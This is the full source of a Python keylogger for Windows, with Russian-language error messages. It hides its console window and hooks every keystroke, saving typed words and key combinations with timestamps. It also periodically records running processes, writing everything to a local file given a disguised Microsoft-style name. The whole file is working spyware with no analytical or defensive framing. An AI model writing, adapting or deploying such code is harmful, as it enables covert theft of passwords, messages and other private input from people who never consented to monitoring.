import keyboard
import logging
from datetime import datetime
import time
import threading
import win32console
import win32gui
import psutil

window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

class LogManager:
    def __init__(self, log_file):
        self.log_file = log_file

    def write(self, data):
        try:
            with open(self.log_file, 'at') as f:
                f.write(data)
        except Exception as e:
            logging.error(f"Ошибка при записи в файл: {e}")

    def write_error(self, error_message):
        timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
        with open(self.log_file, 'at') as f:
            f.write(f"{timestamp} - ERROR - {error_message}\n")

class KeyboardEventHandler:
    def __init__(self, buffer_limit=50):
        self.buffer = ""
        self.current_word = ""
        self.buffer_limit = buffer_limit
        self.is_ctrl_pressed = False
        self.is_shift_pressed = False
        self.is_alt_pressed = False

    def handle_event(self, event):
        if event.event_type == 'down':
            if event.name == 'ctrl':
                self.is_ctrl_pressed = True
            elif event.name == 'shift':
                self.is_shift_pressed = True
            elif event.name == 'alt':
                self.is_alt_pressed = True
            if self.is_ctrl_pressed or self.is_shift_pressed or self.is_alt_pressed:
                combo = '+'.join([key for key, pressed in [('Ctrl', self.is_ctrl_pressed),
                                                          ('Shift', self.is_shift_pressed),
                                                          ('Alt', self.is_alt_pressed),
                                                          (event.name, True)] if pressed])
                timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
                self.buffer += f"{timestamp} - {combo}\n"
            else:
                if event.name in ['space', 'enter']:
                    timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
                    self.buffer += f"{timestamp} - {self.current_word}\n"
                    self.current_word = ""
                else:
                    self.current_word += event.name

        elif event.event_type == 'up':
            if event.name == 'ctrl':
                self.is_ctrl_pressed = False
            elif event.name == 'shift':
                self.is_shift_pressed = False
            elif event.name == 'alt':
                self.is_alt_pressed = False

        return self.buffer

class KeyLogger:
    def __init__(self, log_manager, event_handler, flush_interval=5, process_log_interval=5):
        self.log_manager = log_manager
        self.event_handler = event_handler
        self.flush_interval = flush_interval
        self.process_log_interval = process_log_interval
        self.last_process_log_time = time.time()
        self.logged_processes = set()

    def log_processes(self):
        current_processes = set()
        for process in self.get_running_processes():
            process_id = process['pid']
            current_processes.add(process_id)
            if process_id not in self.logged_processes:
                process_info = f"Process ID: {process_id}, Name: {process['name']}"
                self.log_manager.write(process_info + "\n")
                self.logged_processes.add(process_id)
        self.logged_processes = current_processes

    def get_running_processes(self):
        processes = []
        for process in psutil.process_iter(['pid', 'name']):
            processes.append(process.info)
        return processes

    def flush_buffer(self):
        self.log_manager.write(self.event_handler.buffer)
        self.event_handler.buffer = ""

    def on_key_event(self, event):
        buffer = self.event_handler.handle_event(event)
        if len(buffer) >= self.event_handler.buffer_limit:
            self.flush_buffer()

    def start(self):
        self.log_processes()
        keyboard.hook(self.on_key_event)
        self.start_periodic_flush()

    def start_periodic_flush(self):
        def flush_periodically():
            while True:
                time.sleep(self.flush_interval)
                self.flush_buffer()
                if time.time() - self.last_process_log_time > self.process_log_interval:
                    self.log_processes()
                    self.last_process_log_time = time.time()
        flush_thread = threading.Thread(target=flush_periodically)
        flush_thread.daemon = True
        flush_thread.start()

if __name__ == "__main__":
    log_manager = LogManager('Microsoft_8wepyb3d98bwe.txt')
    event_handler = KeyboardEventHandler()
    keylogger = KeyLogger(log_manager, event_handler)
    try:
        keylogger.start()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        keylogger.flush_buffer()
    except Exception as e:
        log_manager.write_error(f"Непредвиденная ошибка: {e}")